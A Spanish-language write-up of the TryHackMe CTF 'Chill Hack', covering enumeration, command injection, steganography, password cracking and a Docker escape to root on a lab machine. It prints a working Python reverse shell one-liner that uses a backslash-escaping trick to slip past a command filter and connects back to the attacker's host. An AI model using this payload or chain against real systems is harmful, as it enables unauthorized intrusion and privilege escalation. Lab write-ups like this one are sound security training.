![image](https://user-images.githubusercontent.com/99112106/181498877-8eacdc39-2aea-4c75-b140-d9fb7d4b94cc.png)

# Chill Hack

Chill Hack es un CTF sencillo de TryHackMe en el que veremos command injection, un poco de estenografía, escalada de privilegios lateral desde un script de bash y escape de entornos Docker.

Empezaremos lanzando un escaneo con Nmap:

```
nmap -sC -sV -p- 10.10.87.50     
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-28 12:16 CEST
Nmap scan report for 10.10.87.50
Host is up (0.036s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.180.82
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 09:f9:5d:b9:18:d0:b2:3a:82:2d:6e:76:8c:c2:01:44 (RSA)
|   256 1b:cf:3a:49:8b:1b:20:b0:2c:6a:a5:51:a8:8f:1e:62 (ECDSA)
|_  256 30:05:cc:52:c6:6f:65:04:86:0f:72:41:c8:a4:39:cf (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Game Info
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.05 seconds
```

Tras el escaneo, podemos ver que tenemos como posibles vectores de ataque los puertos 21 (FTP), 22 (SSH) y 80 (HTTP).

El acceso anónimo está habilitado en FTP asique echaremos un primer vistazo ahí. Encontramos un fichero de texto "note.txt".

![image](https://user-images.githubusercontent.com/99112106/181498905-c4ff0567-8e31-4f83-9ac9-9b2f4f331375.png)

Gracias a esa nota podemos listar 2 usuarios; "Anurodh" y "Apaar":

![image](https://user-images.githubusercontent.com/99112106/181498924-01c4bbe5-1c43-49c8-8d1a-e47c886671f9.png)

Echando un vistazo al sitio web en el puerto 80 podemos ver la siguiente página. Nada fuera de lo común a simple vista:

![image](https://user-images.githubusercontent.com/99112106/181498943-51b7af16-58ba-41df-9ed3-2c2d349b87cc.png)

Vamos a listar posibles directorios con Gobuster que nos permitan avanzar:

```
gobuster dir -u http://10.10.87.50 -w /usr/share/wordlists/dirb/big.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.87.50
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/07/28 12:24:11 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/css                  (Status: 301) [Size: 308] [--> http://10.10.87.50/css/]
/fonts                (Status: 301) [Size: 310] [--> http://10.10.87.50/fonts/]
/images               (Status: 301) [Size: 311] [--> http://10.10.87.50/images/]
/js                   (Status: 301) [Size: 307] [--> http://10.10.87.50/js/]    
/secret               (Status: 301) [Size: 311] [--> http://10.10.87.50/secret/]
/server-status        (Status: 403) [Size: 276]                                 
                                                                                
===============================================================
2022/07/28 12:25:26 Finished
===============================================================
```

Lo primero que nos llama la atención es el directorio "secret". Si lo visitamos, podemos ver un campo donde en teoría se procesan los comandos que le demos:

![image](https://user-images.githubusercontent.com/99112106/181498963-d33c5e2b-c2b7-40c9-b0be-bad5a05c4016.png)

Tras trastear un poco, empiezo a identificar los comandos permitidos (id,pwd,whoami...) y los que no (head, tail, cat, ls...). En vez de "cat" podemos usar "xxd" y en vez de "ls" podemos usar "echo *."

Después de intentar extraer información sin éxito con los comandos permitidos decido centrarme en conseguir ejecutar una reverse shell en el servidor. Tras muchos intentos, descubro gracias a PayloadAllTheThings que escapando la palabra "python", podría ejecutarlo. Este es el ejemplo que dan ellos:

![image](https://user-images.githubusercontent.com/99112106/181498990-525f5264-7b59-448f-9057-a6b4fe91ea72.png)

(https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)

Por tanto, nuestra reverse shell sería la siguiente:

```
p\ython3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.180.82",4321));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Tras poner el puerto a la escucha y ejecutar la revershel shell, recibimos nuestra shell:

![image](https://user-images.githubusercontent.com/99112106/181499043-3539141a-363d-4ca0-8ac2-f4e0e475216c.png)

Aparentemente podemos ejecutar con privilegios de sudo el script "helpline.sh" ubicado en el home path del usuario Apaar:

![image](https://user-images.githubusercontent.com/99112106/181499069-ffe093ee-7680-411f-aa4e-f525796b0c52.png)

El script tiene el siguiente contenido:

![image](https://user-images.githubusercontent.com/99112106/181499078-db89db85-90c2-4819-96f6-2cfef62f4b09.png)

Si ejecutamos el script como Apaar e introducimos el contenido "/bin/sh" como respuesta al script, obtendremos una shell con Apaar:

![image](https://user-images.githubusercontent.com/99112106/181499091-48216193-e109-4ab4-8ece-8954bc2c7c8c.png)

Llegados a este punto, podemos retirar la primera bandera;

![image](https://user-images.githubusercontent.com/99112106/181499104-bfe360bb-f6ec-4470-9a0b-a192edcf0fef.png)

Es el momento de empezar nuestra escalada hacia root. Para ello, levantaré un servidor HTTP con Python en mi máquina y descargaré en el servidor vulnerable el script "linpeas":

![image](https://user-images.githubusercontent.com/99112106/181499119-01498fe7-65a5-4a17-88bc-00ba9fa8ee17.png)

LinPeas es un script que nos permite automatizar el escaneo de vulnerabilidades o posibles vectores de ataque dentro de una máquina linux.

Una vez lo tenemos, le otorgamos permisos de ejecución y le damos caña:

![image](https://user-images.githubusercontent.com/99112106/181499170-f65d2c86-a6fb-4365-b760-876e2bff85b8.png)

Observamos que el puerto 3306 se encuentra abierto, por lo que debe haber un servidor MySQL corriendo... pero necesitamos credenciales...

![image](https://user-images.githubusercontent.com/99112106/181499181-348e65c1-ac83-497f-8cdf-6fa75b9ddcf2.png)

Decidí empezar a enumerar de nuevo desde nuestro primera entrada en "/var/www/html/secret" donde encontré un directorio interesante, "/var/www/files". 

![image](https://user-images.githubusercontent.com/99112106/181499198-902f7b79-6942-4e4b-857b-40a347686a89.png)

Entre los ficheros que encontré, "hacker.php" nos otorgaba una pista:

![image](https://user-images.githubusercontent.com/99112106/181499211-b1cd0fe5-437d-4a5b-ab23-de17f49705ac.png)

"You have reached this far. Look in the dark! You will find your answer"

Decido descargar dicha imagen. Para ello, monto un servidor HTTP con Python en el server vulnerable:

![image](https://user-images.githubusercontent.com/99112106/181499225-60041a1d-7cf1-47dd-9c6f-bfb0af8f7830.png)

Y descargo la imagen a través del navergador, easy:

![image](https://user-images.githubusercontent.com/99112106/181499240-9bc14f1e-d1dc-4dc3-8345-c4a6a51f8479.png)

Por cierto, la imagen es esta, creepy as fuck:

![image](https://user-images.githubusercontent.com/99112106/181499247-258df239-4e0c-4d3e-8ee0-06051d2df85e.png)

Pero lo que nos puede interesar no está en el exterior, sino en el interior... muy poético. Usando la herramienta "steghide" y sin aportar salvoconducto, conseguimos extraer un fichero comprimido:

![image](https://user-images.githubusercontent.com/99112106/181499322-93d2beeb-b5c0-4b00-a564-1ede493c21c2.png)

Pero a la hora de descomprimirlo, si nos pide contraseña:

![image](https://user-images.githubusercontent.com/99112106/181499346-dfdd222b-d7bc-42bd-91ce-24dd94173e0c.png)

Parece que es el momento de llamar al bueno de John para que nos ayude. Lo primero que haremos será obtener el hash del comprimido:

![image](https://user-images.githubusercontent.com/99112106/181499365-420492a2-62ed-4acb-bef0-010ef9198afd.png)

Una vez lo tenemos, podemos usar JohnTheRipper para crackear la contraseña:

![image](https://user-images.githubusercontent.com/99112106/181499390-8d74451a-62cd-49a3-8613-91f4c58e62c3.png)

¡Eso fue rápido! Se han portado bien ;)

Conseguimos descomprimir el archivo y obtenemos el fichero "source_code.php" en el cual podemos ver lo que parece una contraseña en Base64 para el usuario "Anurodh":

![image](https://user-images.githubusercontent.com/99112106/181499451-ffb0c197-9354-41c0-a6d9-734c9d83d763.png)

Decodificamos la password con Cyberchef o mediante la consola:

![image](https://user-images.githubusercontent.com/99112106/181499494-edb70af9-931f-4469-97f9-063b9b3b08bd.png)

Y una vez la tenemos, volvemos al servidor vulnerable y cambiamos de usuario a "Anurodh"!!

![image](https://user-images.githubusercontent.com/99112106/181499516-4d4f0b3e-3655-4b1f-945f-7ae288beafbf.png)

Tras investigar un poco, observo que "Anurodh" pertenece al grupo "docker" por lo que podríamos intentar abusar de esto.

![image](https://user-images.githubusercontent.com/99112106/181499541-2dd3c71a-f3b2-4706-a5e9-7dcd4c9d381d.png)

Echando mano de GTFOBins encontramos un posible método de escalada:

![image](https://user-images.githubusercontent.com/99112106/181499578-abc6c44c-e7f5-48c3-9d9b-441ba73d960a.png)

https://gtfobins.github.io/gtfobins/docker/#shell

Lo ejecutamos y conseguimos escapar del contenedor y obtener una shell con root:

![image](https://user-images.githubusercontent.com/99112106/181499600-f5d8d745-c864-4543-b9d5-2dcb44bc2a61.png)

Finalmente, encontramos la última bandera en el directorio de root:

![image](https://user-images.githubusercontent.com/99112106/181499616-dfb0304d-024a-4e0a-9cd6-7de0f87f236c.png)

He de decir que es de las más originales que he visto hasta la fecha ;)
